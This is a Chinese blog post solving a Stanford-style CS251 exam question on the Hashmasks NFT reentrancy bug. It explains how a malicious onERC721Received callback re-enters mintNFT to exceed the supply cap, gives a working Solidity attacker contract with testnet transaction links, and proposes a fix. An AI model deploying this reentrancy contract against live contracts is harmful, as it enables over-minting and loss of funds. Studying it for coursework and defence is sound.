# CS251 - final 2021 - 问题 4


**问题4. [16 分]: Hashmasks 重入缺陷**

在第8课和第3节中，我们讨论了 solidity 重入缺陷。在这个问题中，我们将看一个有趣的现实世界的例子。考虑下面16384个NFT中使用的 solidity 代码片段。通过调用此NFT合约上的 `mintNFT()` 函数，用户一次最多可以铸造20个NFT。您可以假设所有内部变量都由构造函数正确初始化（未显示）。

<!--more-->

```solidity
  function mintNFT(uint256 numberOfNfts) public payable {
    require(totalSupply() < 16384, 'Sale has already ended');
    require(numberOfNfts > 0, 'numberOfNfts cannot be 0');
    require(numberOfNfts <= 20, 'You may not buy more than 20 NFTs at once');
    require(totalSupply().add(numberOfNfts) <= 16384, 'Exceeds NFT supply');
    require(getNFTPrice().mul(numberOfNfts) == msg.value, 'Value sent is not correct');
    for (uint256 i = 0; i < numberOfNfts; i++) {
      uint256 mintIndex = totalSupply(); // get number of NFTs issued so far
      _safeMint(msg.sender, mintIndex); // mint the next one
    }
  }

  function _safeMint(address to, uint256 tokenId) internal virtual override {
    // Mint one NFT and assign it to address(to).
    require(!_exists(tokenId), 'ERC721: token already minted');
    _data = _mint(to, tokenId); // mint NFT and assign it to address to
    _totalSupply++; // increment totalSupply() by one
    if (to.isContract()) {
      // Confirm that NFT was recorded properly by calling
      // the function onERC721Received() at address(to).
      // The arguments to the function are not important here.
      // If onERC721Received is implemented correctly at address(to) then
      // the function returns _ERC721_RECEIVED if all is well.
      bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);
      require(retval == _ERC721_RECEIVED, 'NFT Rejected by receiver');
    }
  }
```

让我们证明 `_safeMint` 根本不安全（尽管它的名字是安全）。

**A)**    假设已经铸造了16370个NFT，那么 totalSupply()=16370。请解释恶意合约如何导致超过16384个NFT被伪造。攻击者最多可以造出多少个NFT？

提示：如果在调用地址 `onERC721Received` 是恶意的，结果会怎样？请仔细检查铸币回路，并考虑重入缺陷。

**答：** 在已经 mint 16370 个NFT基础上，调用 mingNFT 可传入的最大 numberOfNfts 为 14 可以通过 mintNFT 开始五行的限制，当上述合约在调用地址 `to` 上的 `onERC721Received` 函数时，这个函数可以再次调用上述 mingNFT 函数，此时，在原来已经 mint 一个的基础上，传入的 numberOfNfts 为 13 个可以通过 mintNFT 的限制，然后重复同样的过程，依次可以 mint 12， 11 直到 1，最后在函数内部，已经没有其他限制，故这些数量的 NFT 均可以被 mint，所以理论上总共可以 mint 的数量为 $14+13+\dots+2+1=105$。

**B)**    假设现在总供给的价值是16370，请写出实施对（a）部分进行攻击的恶意Solidity合约代码。

**答：** 

```solidity
contract Attacker is IERC721Receiver {
  Hashmasks hashmasks;

  constructor(address _hashmasksAddress) {
    hashmasks = Hashmasks(_hashmasksAddress);
  }

  function attack() public payable{
    {
      uint256 num = hashmasks.balanceOf(address(this));
      // console.log("num: ", num);
      if (num < 14) {
        // 16384 - 16370 = 14
        hashmasks.mintNFT{value: 14-num}(14 - num);
      }
    }
  }

  function onERC721Received(
    address _from,
    address _to,
    uint256 _tokenId,
    bytes memory _data
  ) external returns (bytes4) {
    attack();
    return msg.sig;
  }
}
```

其中 `attack` 设置为 *`payable` 是因为需要通过攻击合约调用 mintNFT 函数，需要发送一定数量的以太，可以选择在部署后先发送一定数量的以太到攻击者合约中，也可以将 `attack` 设置成 `payable`，在攻击的交易中发送以太到*

实验：在 Rinkeby 上部署，攻击者合约地址为 0xf1eb80Bb66A70E44d42B3ceC0bC18Ec28B5F2Ea8，实际攻击的交易：[https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f](https://rinkeby.etherscan.io/tx/0xb90496fd8789c3d1800df1bd3a571d019fb6158cbd521a9d05e57ad62460d15f)，这个部署的合约中，NFT的价格设置为 1 wei，所以理论上只要发送 105 wei 到攻击这合约中，但是保险起见，发送了150wei，最后也可以看到攻击这合约中还剩下 45 wei。

**C)**    你会在前一页的代码中添加或更改哪一行Solidity来防止你的攻击?请注意，单个交易不应该铸造超过20个NFT。

**答：** 可以将 `_safeMint` 方法中， `_totalSupply++;` 这一行放到验证 NFT 的调用之后：

```solidity
  function _safeMint(address to, uint256 tokenId) internal virtual override {
    // Mint one NFT and assign it to address(to).
    require(!_exists(tokenId), 'ERC721: token already minted');
    _data = _mint(to, tokenId); // mint NFT and assign it to address to
    
    if (to.isContract()) {
      // Confirm that NFT was recorded properly by calling
      // the function onERC721Received() at address(to).
      // The arguments to the function are not important here.
      // If onERC721Received is implemented correctly at address(to) then
      // the function returns _ERC721_RECEIVED if all is well.
      bytes4 memory retval = IERC721Receiver(to).onERC721Received(to, address(0), tokenId, _data);
      require(retval == _ERC721_RECEIVED, 'NFT Rejected by receiver');
    }
	_totalSupply++; // increment totalSupply() by one
  }
```

这样，当合约被重入攻击时，由于 `_totalSupply` 还没有增加，因此在第二次进入 `mintNFT` 函数时 `mintIndex` 的值是第一次 mint 的值，会导致触发 `'ERC721: token already minted'` 这个错误，有效保证合约安全。

```solidity
    for (uint256 i = 0; i < numberOfNfts; i++) {
      uint256 mintIndex = totalSupply(); // get number of NFTs issued so far
      _safeMint(msg.sender, mintIndex); // mint the next one
    }
```

验证交易： https://rinkeby.etherscan.io/tx/0xa5f70a226c5fd64132eee800f8902ddb9b4ff562ff7f37820d11746fbde52acb

感谢 discord **yyczz#5837** 对于这个问题的指导。

[View on GitHub](https://github.com/qiwihui/blog/issues/157)


